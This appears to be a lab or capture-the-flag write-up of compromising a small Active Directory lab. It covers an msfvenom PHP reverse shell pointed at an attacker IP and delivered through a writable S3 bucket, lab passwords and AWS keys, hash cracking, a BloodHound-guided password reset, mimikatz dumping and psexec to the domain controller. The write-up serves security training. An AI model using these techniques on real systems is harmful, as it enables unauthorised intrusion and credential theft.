# Poseidon
## Network

**Given:**

- 192.168.192.0/24

**Found:**

- 192.168.167.168 storage (linux)
- 192.168.167.169 DC01
- 192.168.167.170 MS01
- 192.168.167.171 MS02

## Creds

```
eric.wallows:EricLikesRunning800
jeff.borrows:naruto
administrator:BigFeast999! (local admin from .171)

john.doe:anthony
jane.smith:abc123
bob.johnson:butterfly
jeff.borrows:naruto
alice.williams:andrew
charlie.brown:tweety

other users:

John.Lark
Jane.Smith
Alice.Owal
Bob.Johnson
```

## Enumeration

Ping sweeping the subnet to find four machines.

![](assets/Pasted%20image%2020250228105558.png)

## 192.168.167.168 storage

### Enumeration

![](assets/Pasted%20image%2020250228111044.png)

With feroxbuster we discover /storage

![](assets/Pasted%20image%2020250228120317.png)

![](assets/Pasted%20image%2020250228120343.png)

We can see those csv with curl

![](assets/Pasted%20image%2020250228121300.png)

And get 4 users

This is a s3 bucket, let's enumera it.

![](assets/Pasted%20image%2020250228153615.png)

![](assets/Pasted%20image%2020250228153544.png)

We can upload objects so we ca try to upload a reverse shell.

```bash
msfvenom -p php/reverse_php LHOST=192.168.45.191 LPORT=6666 -o shell.php
```

![](assets/Pasted%20image%2020250228155830.png)

## 192.168.167.170 MS01

### Enumeration

![](assets/Pasted%20image%2020250228111901.png)

We enter the service on the web server and a cloudsync login appears, we use the handed credentials to log in.

![](assets/Pasted%20image%2020250228123326.png)

![](assets/Pasted%20image%2020250228123348.png)

Clicking sync files 

![](assets/Pasted%20image%2020250228123427.png)

### Initial Access

Due to bad permissions on the bucket this service syncs from, we upload a reverse shell. Now if we sync, we pull the shell.

![](assets/Pasted%20image%2020250228160002.png)

We can access it and receive it with nc.

![](assets/Pasted%20image%2020250228160220.png)

### Post Exploitation

Get the flag

![](assets/Pasted%20image%2020250228160705.png)

We can see aws keys

![](assets/Pasted%20image%2020250228160515.png)

```python
$s3Client = new S3Client([
    'version' => 'latest',
    'region'  => 'us-east-1',
    'endpoint' => $endpoint,
    'use_path_style_endpoint' => true,
    'credentials' => [
        'key'    => 'AWS_KEY_47dbe0d90dcd71eb6b371e75e5fe9bc5',
        'secret' => 'AWS_SECRET_26ebe67e93fbd2f9e906a85275cab135',
    ],
]);
```

And enumerate domain users

![](assets/Pasted%20image%2020250228161150.png)

Using that key and configure an aws cli profile shows that is a root account but there is nothing inside.

We can access the mysql db using root.

![](assets/Pasted%20image%2020250228200705.png)

Table cloudsync has some users, let's try to break the passwords.

We recovered 6

![](assets/Pasted%20image%2020250228200951.png)

```bash
john.doe:anthony
jane.smith:abc123
bob.johnson:butterfly
jeff.borrows:naruto
alice.williams:andrew
charlie.brown:tweety
```

We can use bloodhound-python to scout the AD.

![](assets/Pasted%20image%2020250228204421.png)

Now import it into bh, we can see jeff.borrows has  a  generic all to mario.lemiux.

![](assets/Pasted%20image%2020250228204535.png)

Change mario's passwords

![](assets/Pasted%20image%2020250228205948.png)

## 192.168.167.171 MS02

### Enumeration

![](assets/Pasted%20image%2020250228112049.png)

### Initial Access

Using mario.lemieux and the new password.

![](assets/Pasted%20image%2020250228210102.png)

### Privilege Escalation

mario has admin privs so transfer mimikatz and get administrator.

![](assets/Pasted%20image%2020250228210941.png)

Reenter with administrator, but with interactive password.

![](assets/Pasted%20image%2020250228212839.png)

### Post Exploitation

Get the flag

![](assets/Pasted%20image%2020250228213743.png)

## 192.168.167.169 DC01

### Enumeration

![](assets/Pasted%20image%2020250228111339.png)

### Initial Access

Using administrator creds from ms02 (it's a domain admin), use psexec with interactive password.

![](assets/Pasted%20image%2020250228214130.png)

### Post Exploitation

Get the flag

![](assets/Pasted%20image%2020250228214402.png)